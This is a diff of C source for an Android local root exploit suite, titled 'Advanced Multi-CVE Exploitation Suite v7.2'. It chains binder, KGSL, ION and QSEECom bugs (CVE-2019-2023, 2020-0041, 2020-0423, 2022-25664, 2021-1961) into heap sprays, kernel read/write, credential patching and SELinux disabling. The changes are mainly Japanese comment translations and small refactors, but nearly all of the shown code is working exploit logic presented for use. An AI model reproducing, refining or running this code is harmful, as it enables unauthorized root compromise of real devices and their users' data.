@@ -28,9 +28,10 @@
 #include <stdint.h>
 #include <sys/fsuid.h>
 #include <sys/shm.h>
-#include "ashmem.h"
-#include "ion.h"
+
 #include "binder.h"
+#include "ion.h"
+#include "ashmem.h"
 #include "offsets.h"
 
 extern int setfsuid(uid_t);
@@ -47,7 +48,7 @@ extern int setfsgid(gid_t);
 #define ION_SPRAY_SIZE 0x1000
 #define ASHMEM_SPRAY_COUNT 64
 
-/* KGSL ioctls */
+/* KGSL ioctls (カーネルヘッダがない場合の独自定義) */
 #define KGSL_IOC_TYPE 0x09
 struct kgsl_gpumem_alloc {
     unsigned long gpuaddr;
@@ -88,24 +89,6 @@ struct kgsl_gpu_command {
 #define KGSL_CMDLIST_IB 0x00000001U
 #define KGSL_GPUMEM_CACHE_INV (1 << 1)
 
-/* ION */
-#define ION_IOC_ALLOC _IOWR('I', 1, struct ion_allocation_data)
-#define ION_IOC_FREE _IOWR('I', 2, struct ion_handle_data)
-#define ION_IOC_MAP _IOWR('I', 3, struct ion_fd_data)
-struct ion_allocation_data {
-    size_t len;
-    unsigned int heap_id_mask;
-    unsigned int flags;
-    unsigned int handle;
-};
-struct ion_handle_data {
-    unsigned int handle;
-};
-struct ion_fd_data {
-    unsigned int handle;
-    int fd;
-};
-
 /* Global state */
 static int g_krw_pipe[2] = {-1, -1};
 static uint64_t g_task_struct = 0;
@@ -118,7 +101,7 @@ static int g_cve_2019_2023_handle = -1;
 static int g_ion_fd = -1;
 static void *g_ion_map = MAP_FAILED;
 
-/* ---- プロトタイプ ---- */
+/* ---- プロトタイプ宣言 ---- */
 static int setup_kernel_rw(void);
 static int patch_kernel_cred(void);
 static int final_root_check(void);
@@ -153,7 +136,7 @@ static int try_ptrace_root(void);
 static int try_modprobe_method(void);
 static int try_overlayfs_method(void);
 
-/* Utilities */
+/* ---- ユーティリティ ---- */
 static void bind_cpu(void) {
     cpu_set_t cpu_set;
     CPU_ZERO(&cpu_set);
@@ -161,12 +144,15 @@ static void bind_cpu(void) {
     if (sched_setaffinity(0, sizeof(cpu_set_t), &cpu_set) < 0)
         perror("sched_setaffinity");
 }
+
 static void *mmap_page(unsigned long addr) {
-    void *mem = mmap((void *)addr, PAGE_SIZE, PROT_READ | PROT_WRITE,
+    (void)addr;  /* 固定アドレスは使用しない */
+    void *mem = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
                      MAP_ANONYMOUS | MAP_SHARED, -1, 0);
     if (mem == (void *)-1) perror("mmap");
     return mem;
 }
+
 static int read_with_timeout(int fd, void *buf, size_t count, int timeout_ms) {
     struct pollfd pfd = {.fd = fd, .events = POLLIN};
     int ret = poll(&pfd, 1, timeout_ms);
@@ -175,7 +161,7 @@ static int read_with_timeout(int fd, void *buf, size_t count, int timeout_ms) {
     return read(fd, buf, count);
 }
 
-/* ---- setup_kernel_rw ---- */
+/* ---- カーネル読み書きプリミティブのセットアップ ---- */
 static int setup_kernel_rw(void) {
     if (g_task_struct == 0) return -1;
     if (g_krw_pipe[0] >= 0) { close(g_krw_pipe[0]); close(g_krw_pipe[1]); }
@@ -195,7 +181,7 @@ static int setup_kernel_rw(void) {
     return 0;
 }
 
-/* ---- patch kernel cred ---- */
+/* ---- カーネル cred 構造体の書き換え ---- */
 static int patch_kernel_cred(void) {
     if (g_task_struct == 0 || g_cred_off < 0 || g_krw_pipe[0] < 0) return -1;
     uint64_t cred_addr = g_task_struct + g_cred_off;
@@ -221,7 +207,7 @@ static int patch_kernel_cred(void) {
     return 0;
 }
 
-/* ---- CVE-2019-2023 ---- */
+/* ---- CVE-2019-2023 (hwservicemanager ACL bypass) ---- */
 static int exploit_cve_2019_2023(void) {
     int hwbinder_fd, ret;
     uint8_t read_buf[4096];
@@ -278,7 +264,7 @@ static int exploit_cve_2019_2023(void) {
     return 0;
 }
 
-/* ---- CVE-2020-0041 (test only) ---- */
+/* ---- CVE-2020-0041 (テスト) ---- */
 static int test_cve_2020_0041(void) {
     int fd = open("/dev/binder", O_RDWR);
     if (fd < 0) return -1;
@@ -298,14 +284,15 @@ static int test_cve_2020_0041(void) {
     bwr.write_size = sizeof(tx);
     bwr.write_buffer = (binder_uintptr_t)&tx;
     bwr.read_size = 4096;
-    bwr.read_buffer = (binder_uintptr_t)malloc(4096);
+    uint8_t *rbuf = malloc(4096);
+    bwr.read_buffer = (binder_uintptr_t)rbuf;
     int ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
-    free((void*)bwr.read_buffer);
+    free(rbuf);
     close(fd);
     return (ret == 0) ? 0 : -1;
 }
 
-/* ---- CVE-2020-0423 test ---- */
+/* ---- CVE-2020-0423 (テスト) ---- */
 static int test_cve_2020_0423(void) {
     int fd = open("/dev/binder", O_RDWR);
     if (fd < 0) return -1;
@@ -320,7 +307,7 @@ static int test_cve_2020_0423(void) {
     return (n > 0) ? 0 : -1;
 }
 
-/* ---- CVE-2022-25664 improved leak ---- */
+/* ---- CVE-2022-25664 (GPU メモリリーク) ---- */
 static int exploit_cve_2022_25664_leak(uint64_t *out_addr, uint64_t *out_kernel_base) {
     int kgsl_fd;
     struct kgsl_gpumem_alloc alloc;
@@ -346,7 +333,9 @@ static int exploit_cve_2022_25664_leak(uint64_t *out_addr, uint64_t *out_kernel_
         sync.offset = 0;
         sync.length = alloc.size;
         if (ioctl(kgsl_fd, IOCTL_KGSL_GPUMEM_SYNC_CACHE, &sync) < 0) {
-            munmap(gpu_mem, alloc.size); close(kgsl_fd); continue;
+            munmap(gpu_mem, alloc.size);
+            close(kgsl_fd);
+            continue;
         }
         memcpy(leaked_data, gpu_mem, sizeof(leaked_data));
         munmap(gpu_mem, alloc.size);
@@ -365,7 +354,7 @@ static int exploit_cve_2022_25664_leak(uint64_t *out_addr, uint64_t *out_kernel_
     return -1;
 }
 
-/* ---- CVE-2020-0423 RW (improved spray) ---- */
+/* ---- CVE-2020-0423 UAF によるカーネル読み書き ---- */
 static int exploit_cve_2020_0423_rw(void) {
     for (int attempt=0; attempt<ATTEMPTS; attempt++) {
         int binder_fd = open("/dev/binder", O_RDWR);
@@ -400,7 +389,7 @@ static int exploit_cve_2020_0423_rw(void) {
             for (int j=0; j<i; j++) { close(spray_pipes[j][0]); close(spray_pipes[j][1]); }
             close(binder_fd); close(epoll_fd); wait(NULL); continue;
         }
-        void *leak_buf = mmap_page(0x100000000UL);
+        void *leak_buf = mmap_page(0);
         if (!leak_buf) {
             for (int j=0; j<SPRAY_PIPE_COUNT; j++) { close(spray_pipes[j][0]); close(spray_pipes[j][1]); }
             close(binder_fd); close(epoll_fd); wait(NULL); continue;
@@ -440,7 +429,7 @@ static int exploit_cve_2020_0423_rw(void) {
     return -1;
 }
 
-/* ---- CVE-2020-0041 OOB patch cred (experimental) ---- */
+/* ---- CVE-2020-0041 OOB 書き込みによる cred 書き換え (実験的) ---- */
 static int exploit_cve_2020_0041_patch_cred(void) {
     int fd = open("/dev/binder", O_RDWR);
     if (fd < 0) return -1;
@@ -477,7 +466,7 @@ static int exploit_cve_2020_0041_patch_cred(void) {
     return -1;
 }
 
-/* ---- CVE-2021-1961 ---- */
+/* ---- CVE-2021-1961 (QSEECom) ---- */
 static int exploit_cve_2021_1961(void) {
     int fd = open("/dev/qseecom", O_RDWR);
     if (fd < 0) return -1;
@@ -491,7 +480,7 @@ static int exploit_cve_2021_1961(void) {
     return (ret == 0) ? 0 : -1;
 }
 
-/* ---- SELinux disable (kernel) ---- */
+/* ---- SELinux 無効化 (カーネル書き込み) ---- */
 static int try_selinux_disable_via_kernel(void) {
     if (g_krw_pipe[0] < 0) return -1;
     uint64_t selinux_addr = SELINUX_ENFORCING;
@@ -505,7 +494,7 @@ static int try_selinux_disable_via_kernel(void) {
     return 0;
 }
 
-/* ---- Fallback methods (unchanged from original) ---- */
+/* ---- フォールバック手法群 ---- */
 static int try_all_setuid_methods(void) {
     if (setuid(0) == 0) return 0;
     if (setreuid(0,0) == 0) return 0;
@@ -654,7 +643,7 @@ static int run_exploit_with_timeout(int (*func)(void), int timeout_sec) {
     return -1;
 }
 
-/* ---- Additional spray techniques ---- */
+/* ---- 追加スプレー手法 ---- */
 static int ion_spray(void) {
     g_ion_fd = open("/dev/ion", O_RDWR);
     if (g_ion_fd < 0) return -1;
@@ -726,7 +715,7 @@ static int try_ashmem_uaf(void) {
 static int try_proc_mem_write(void) {
     int fd = open("/proc/self/mem", O_RDWR);
     if (fd < 0) return -1;
-    uint64_t target = 0; // dummy
+    uint64_t target = 0;
     if (write(fd, &target, 8) == 8) { close(fd); return 0; }
     close(fd);
     return -1;
@@ -765,7 +754,7 @@ int main(void) {
     uint64_t leaked_addr = 0;
 
     printf("==================================================\n");
-    printf("  Advanced Multi-CVE Exploitation Suite v7.0\n");
+    printf("  Advanced Multi-CVE Exploitation Suite v7.2\n");
     printf("  (CVE-2019-2023, 2020-0041, 2020-0423,\n");
     printf("   CVE-2022-25664, CVE-2021-1961, plus fallbacks)\n");
     printf("==================================================\n\n");
